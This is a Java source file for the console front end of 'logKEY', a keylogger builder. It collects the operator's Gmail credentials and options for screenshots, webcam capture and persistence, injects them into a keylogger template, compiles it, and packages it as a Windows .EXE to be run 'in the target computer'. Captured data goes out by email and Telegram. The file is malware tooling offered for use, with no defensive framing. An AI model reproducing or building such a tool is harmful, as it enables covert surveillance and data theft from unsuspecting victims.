package logkey.ui;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.nio.channels.FileChannel;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.io.Console;

public class logKEY {

    public static final String RESET = "\u001B[0;1m";
    public static final String BLACK = "\u001B[30;1m";
    public static final String RED = "\u001B[31;1m";
    public static final String GREEN = "\u001B[32;1m";
    public static final String YELLOW = "\u001B[33;1m";
    public static final String BLUE = "\u001B[34;1m";
    public static final String PURPLE = "\u001B[35;1m";
    public static final String CYAN = "\u001B[36;1m";
    public static final String WHITE = "\u001B[37;1m";
    public static Scanner scanner = new Scanner(System.in);
    public static String email;
    public static String password;
    public static String count;
    public static boolean screenshot;
    public static boolean webcam;
    public static boolean persistence;
    public static boolean keep_data;
    public static String path_source = "src/main/java/logkey/keylogger/Keylogger.java";

    public static void main(String[] args) throws IOException {
        detectOS();
        clearScreen();
        showMenu();
    }

    private static void detectOS() {
        if (!System.getProperty("os.name").toLowerCase().equalsIgnoreCase("linux")) {
            System.out.println("[!] OS is not supported!");
            System.exit(0);
        }
    }

    private static void clearScreen() {
        System.out.print("\033\143");
    }

    private static void waitTime(int time) throws InterruptedException {
        TimeUnit.SECONDS.sleep(time);
    }

    private static void replaceWord(String oldWord, String newWord, String file_name) {
        try {
            File file = new File(file_name);
            BufferedReader reader = new BufferedReader(new FileReader(file));
            String line = "", oldtext = "";
            while ((line = reader.readLine()) != null) {
                oldtext += line + "\r\n";
            }
            reader.close();
            String newtext = oldtext.replaceAll(oldWord, newWord);
            FileWriter writer = new FileWriter(file_name);
            writer.write(newtext);
            writer.close();
        } catch (IOException ioe) {
            System.out.println(RED + " [!] Error to generate file! " + ioe.getMessage());
            deleteFolder("src/");
            System.exit(0);
        }
    }

    public static void copyFolder(File src, File dest) throws IOException {
        if (src.isDirectory()) {
            if (!dest.exists()) {
                dest.mkdir();
            }
            String files[] = src.list();
            for (String file : files) {
                File srcFile = new File(src, file);
                File destFile = new File(dest, file);
                copyFolder(srcFile, destFile);
            }
        } else {
            InputStream in = new FileInputStream(src);
            OutputStream out = new FileOutputStream(dest);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = in.read(buffer)) > 0) {
                out.write(buffer, 0, length);
            }

            in.close();
            out.close();
        }
    }

    private static void deleteFolder(String path) {
        File folder = new File(path);
        if (folder.exists() && folder.isDirectory()) {
            File[] files = folder.listFiles();
            for (File file : files) {
                file.delete();
            }
        }
    }

    private static boolean checkIfFolderExists(String path) {
        File folder = new File(path);
        if (folder.exists() && folder.isDirectory()) {
            return true;
        } else {
            return false;
        }
    }

    private static boolean checkIfFileExists(String file) {
        File path_file = new File(file);
        if (path_file.exists()) {
            return true;
        } else {
            return false;
        }
    }

    private static void copyFile(String source, String dest) {
        File sourceFile = new File(source);
        File destFile = new File(dest);
        FileChannel sourceChannel = null;
        FileChannel destChannel = null;
        try {
            sourceChannel = new FileInputStream(sourceFile).getChannel();
            destChannel = new FileOutputStream(destFile).getChannel();
            destChannel.transferFrom(sourceChannel, 0, sourceChannel.size());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void runProcess(String command, String msg) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            System.out.print(GREEN + "\n" + msg);
            try {
                process.waitFor();
            } catch (InterruptedException ex) {
                System.out.println(RED + " [!] Error! " + ex.getMessage());
                System.exit(0);
            }
        } catch (IOException ex) {
            System.out.println(RED + " [!] Error! " + ex.getMessage());
            System.exit(0);
        }
    }

    private static void showMenu() {

        System.out.println(""
             +  RED + "  lll            ooooooo    ggggggggggggg kkk    kkkkk eeeeeeeeeee yyy          yyy  \n"
             +  RED + "  lll           ooo   ooo   ggg           kkk   kkk    eee          yyy        yyy   \n"
             +  RED + "  lll          ooo     ooo  ggg           kkk  kkk     eee           yyy      yyy    \n"
             +  RED + "  lll         ooo       ooo ggg           kkk kkk      eee            yyy    yyy     \n"
             +  RED + "  lll        ooo        ooo ggg      gggg kkkkkk       eeeeeeeeeee      yyyyyy       \n"
             +  RED + "  lll        ooo        ooo ggg       ggg kkk kkk      eee               yyy         \n"
             +  RED + "  lll         ooo      ooo  ggg       ggg kkk  kkk     eee               yyy         \n"
           + YELLOW + "  lllllllllll  ooo    ooo   ggg       ggg kkk   kkk    eee               yyy         \n"
           + YELLOW + "  lllllllllll    ooooooo    ggggggggggggg kkk    kkkkk eeeeeeeeeee       yyy         \n"
            + WHITE + "                                                                  \n"
            + WHITE + " Close this window if you wish to exit. Otherwise,                \n"
            + WHITE + " press [ENTER] key to continue...                                 \n"
            
        );

        scanner.nextLine();

        showGenerator();
    }

    private static void showGenerator() {
        clearScreen();
        System.out.println(""
                + RED + "          +---------------------------------------------------------+\n"
                + RED + "    (__)  | " + YELLOW + " WARNING: Use Gmail account only!                       " + RED + "|\n"
                + RED + " (|)(00)  | " + WHITE + " [#] Notification on Telegram and E-mail will be sent   " + RED + "|\n"
                + RED + "  |/(__)/ | " + WHITE + "     when it detect inappropriate word (e.g. drug).     " + RED + "|\n"
                + RED + "  |_/ _|  | " + WHITE + " [#] Optionally you can enable Screenshot, Webcam       " + RED + "|\n"
                + RED + "  |_/ _|  | " + WHITE + "     Capture, Keep data and Persistence.                " + RED + "|\n"
                + RED + "          +---------------------------------------------------------+\n"
                +BLUE + "\n NOTE: Allow access to less secure apps on your gmail account.    \n" 
                +WHITE+ " -> https://www.google.com/settings/security/lesssecureapps       \n");

        System.out.println(YELLOW + " GENERATE KEYLOGGER\n" + YELLOW + " ---------------------------------------------------");

        System.out.print(YELLOW + "\n [*] Enter your E-mail: " + WHITE);
        email = scanner.nextLine();
        if(!email.trim().matches("[a-zA-Z_][\\w]*[-]{0,4}[\\w]+@[a-zA-Z0-9]+.[a-zA-Z]{2,6}")){
            System.out.println(RED + "\n [!] Email you have entered is NOT VALID\n");
            try{
                waitTime(2);
                showGenerator();
            } catch (InterruptedException ex) {
                System.out.println(RED + " [!] Error! " + ex.getMessage());
            }
        }
        else {
            while(!email.trim().endsWith("@gmail.com")) {   
                System.out.print(RED + "\n WARNING: USE @gmail.com ONLY! " + WHITE);
                System.out.print(YELLOW + "\n [*] Enter your E-mail: " + WHITE);
                email = scanner.nextLine();
                if(email.trim().equalsIgnoreCase("")){
                    System.out.println(RED + "\n [!] Email you have entered is NOT VALID\n");
                    try{
                        waitTime(2);
                        showGenerator();
                    } catch (InterruptedException ex) {
                        System.out.println(RED + " [!] Error! " + ex.getMessage());
                    }
                }
                else if(!email.trim().matches("[a-zA-Z_][\\w]*[-]{0,4}[\\w]+@[a-zA-Z0-9]+.[a-zA-Z]{2,6}")){
                    System.out.println(RED + "\n [!] Email you have entered is NOT VALID\n");
                    try{
                        waitTime(2);
                        showGenerator();
                    } catch (InterruptedException ex) {
                        System.out.println(RED + " [!] Error! " + ex.getMessage());
                    }
                }
            }
        }

        System.out.print(YELLOW + " [*] Enter your Password: " + WHITE);
        password = scanner.nextLine();
        while(password.equalsIgnoreCase("")) {
            System.out.println(RED + "\n [!] You must enter your password. ");
            System.out.print(YELLOW + " [*] Enter your Password: " + WHITE);
            password = scanner.nextLine();
            if(password.equalsIgnoreCase("")){
                System.out.println(RED + "\n [!] Password you have entered is NOT VALID\n");
                try{
                    waitTime(2);
                    showGenerator();
                } catch (InterruptedException ex) {
                    System.out.println(RED + " [!] Error! " + ex.getMessage());
                }
            }
        }

        System.out.print(YELLOW + " [*] Enable Screenshot (Y/n): " + WHITE);
        String optScreenshot = scanner.nextLine();
        if (optScreenshot.trim().equalsIgnoreCase("y")) {
            screenshot = true;
        } else if (optScreenshot.trim().equalsIgnoreCase("n")) {
            screenshot = false;
        } else if (!optScreenshot.trim().equalsIgnoreCase("")) {
            System.out.println(RED + " [!] Invalid option!");
            try {
                waitTime(2);
                showGenerator();
            } catch (InterruptedException ex) {
                System.out.println(RED + " [!] Error! " + ex.getMessage());
            }
        } else if (optScreenshot.trim().equalsIgnoreCase("")) {
            System.out.println(GREEN + " [+] Default option: Y");
            screenshot = true;
        }

        System.out.print(YELLOW + " [*] Enable WebCam Capture (Y/n): " + WHITE);
        String optCam = scanner.nextLine();
        if (optCam.trim().equalsIgnoreCase("y")) {
            webcam = true;
        } else if (optCam.trim().equalsIgnoreCase("n")) {
            webcam = false;
        } else if (!optCam.trim().equalsIgnoreCase("")) {
            System.out.println(RED + " [!] Invalid option!");
            try {
                waitTime(2);
                showGenerator();
            } catch (InterruptedException ex) {
                System.out.println(ex.getMessage());
            }
        } else if (optCam.trim().equalsIgnoreCase("")) {
            System.out.println(GREEN + " [+] Default option: Y");
            webcam = true;
        }

        System.out.print(YELLOW + " [*] Enable Persistence (Y/n): " + WHITE);
        String optPersistence = scanner.nextLine();
        if (optPersistence.trim().equalsIgnoreCase("y")) {
            persistence = true;
        } else if (optPersistence.trim().equalsIgnoreCase("n")) {
            persistence = false;
        } else if (!optPersistence.trim().equalsIgnoreCase("")) {
            System.out.println(RED + " [!] Invalid option!");
            try {
                waitTime(2);
                showGenerator();
            } catch (InterruptedException ex) {
                System.out.println(RED + " [!] Error! " + ex.getMessage());
            }
        } else if (optPersistence.trim().equalsIgnoreCase("")) {
            System.out.println(GREEN + " [+] Default option: Y");
            persistence = true;
        }

        System.out.print(YELLOW + " [*] Keep data on the target computer? (Y/n): " + WHITE);
        String optData = scanner.nextLine();
        if (optData.trim().equalsIgnoreCase("y")) {
            keep_data = true;
        } else if (optData.trim().equalsIgnoreCase("n")) {
            keep_data = false;
        } else if (!optData.trim().equalsIgnoreCase("")) {
            System.out.println(RED + " [!] Invalid option!");
            try {
                waitTime(2);
                showGenerator();
            } catch (InterruptedException ex) {
                System.out.println(RED + " [!] Error! " + ex.getMessage());
            }
        } else if (optData.trim().equalsIgnoreCase("")) {
            System.out.println(GREEN + " [+] Default option: Y");
            keep_data = true;
        }
    

        System.out.println("\n"
                + GREEN + " +------------------------------------------+\n"
                + GREEN + "   Email: " + WHITE + email + "\n"
                + GREEN + "   Password: " + WHITE + password + "\n"
                + GREEN + "   Screenshot: " + WHITE + screenshot + "\n"
                + GREEN + "   Webcam: " + WHITE + webcam + "\n"
                + GREEN + "   Persistence: " + WHITE + persistence + "\n"
                + GREEN + "   Keep Data: " + WHITE + keep_data + "\n"
                + GREEN + " +------------------------------------------+"
        );

        System.out.print(YELLOW + "\n [*] The information above is correct? (y/n): " + WHITE);
        String optConfirm = scanner.nextLine();
        if (optConfirm.trim().equalsIgnoreCase("y")) {
            // Clone folder
            try {
                deleteFolder("src/");
                copyFolder(new File("src_template/"), new File("src/"));
            } catch (IOException ex) {
                System.out.println(ex.getMessage());
            }

            // Replace data
            replaceWord("email@gmail.com", email, path_source);
            replaceWord("passwordemail", password, path_source);
            if (screenshot) {
                replaceWord("booleanScreenshot", "true", path_source);
            } else {
                replaceWord("booleanScreenshot", "false", path_source);
            }
            if (webcam) {
                replaceWord("booleanCam", "true", path_source);
            } else {
                replaceWord("booleanCam", "false", path_source);
            }
            if (persistence) {
                replaceWord("booleanPersistence", "true", path_source);
            } else {
                replaceWord("booleanPersistence", "false", path_source);
            }
            if (keep_data) {
                replaceWord("booleanKeepData", "true", path_source);
            } else {
                replaceWord("booleanKeepData", "false", path_source);
            }

            runProcess("mvn clean compile assembly:single", " [*] Compiling...\n");

            if (checkIfFolderExists("target/")) {
                System.out.print(GREEN + " [*] Successfully compiled in target/ folder. \n" + WHITE);
            }
                
            copyFile("target/logkey-1.0-jar-with-dependencies.jar", "launch4j/logkey-1.0-jar-with-dependencies.jar");
            runProcess("launch4j/launch4j launch4j/logKEY.xml", " [*] Generating...\n");
            copyFile("launch4j/logkey-1.0-jar-with-dependencies.exe", "target/logkey-1.0-jar-with-dependencies.exe");

            if (checkIfFileExists("target/logkey-1.0-jar-with-dependencies.exe")) {
                System.out.print(GREEN + " [*] Generated .EXE in target/ folder. \n\n" + WHITE);
                System.out.print(BLUE + "\n NOTE: You need to transfer and run the .EXE file in the target computer.\n\n" + WHITE);
            } else {
                System.out.print(RED + " [*] Failed to generate file! \n\n" + WHITE);
            }
            System.exit(0);

        } else if (optConfirm.trim().equalsIgnoreCase("n")) {
            try {
                waitTime(2);
                showGenerator();
            } catch (InterruptedException ex) {
                System.out.println(ex.getMessage());
            }

        } else if (!optConfirm.trim().equalsIgnoreCase("")) {
            System.out.println(RED + " [!] Invalid option!");
            try {
                waitTime(2);
                showGenerator();
            } catch (InterruptedException ex) {
                System.out.println(ex.getMessage());
            }
        }

    }
}